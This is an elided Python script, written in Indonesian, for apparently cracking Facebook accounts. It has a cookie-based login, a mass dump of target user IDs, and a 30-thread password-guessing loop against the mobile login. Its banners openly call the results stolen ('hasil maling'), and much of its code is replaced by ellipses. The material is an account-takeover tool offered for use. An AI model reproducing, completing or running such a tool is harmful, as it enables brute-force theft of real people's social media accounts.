...
for xd in range(10000):
	...
	c=' Infinix X675 Build/RP1A.201005.001; wv)'
...
─░█── ─█▄█─ ▀█▀ █──█ ▀█▀ █──█ ▀▀█
▄▀░▀▄ ──▀── ▀▀▀ ▀▀▀─ ▀▀▀ ▀▀▀▀ ▀▀▀  	
{m} 🌍 {k} ⛔ {h} 🤠 {sir} Recode : KING_RIZKI_378{x}{m} 🤠 {k} ⛔ {h} 🌍 {x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tHEY [green]%s[white] GANTENG/CANTIK'%(my_name)))
	
	alvino_xy(h+ f'>> Your Idz : '+str(my_id))
	print(h+ '>> version : 2,0' )
	print (h+">>"+p+" IP: "+k+ip)
	cetak(nel('\tTERUNTUK [green]%s[white] CRACK SEWAJARNYA AJA,NANTI GW NGGA KE BAGIAN AKUN FACEBOOK'%(my_name))) 
...
def dump_massal():
	...
	for met in range(jum):
		...
		kl = input(f'   {P}MASUKAN ID KE' +str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def login_lagi334():
	...
	try:
		ses = requests.Session()
		banner()
		cetak(nel(f'''SARAN EXTENSI COKIEDOUGH ®''',style='bold white'))
		...
		print(f"{M}[{H}x{M}]Cookies Invalid bro")
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menggeser Satelit  {m}•{k}•{h}•{x} <<<<< ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] Crack Selesai Woy, syukuri aja hasil maling soalnya klo mau ijo print aja Kidz[cyan] <<[white] '))
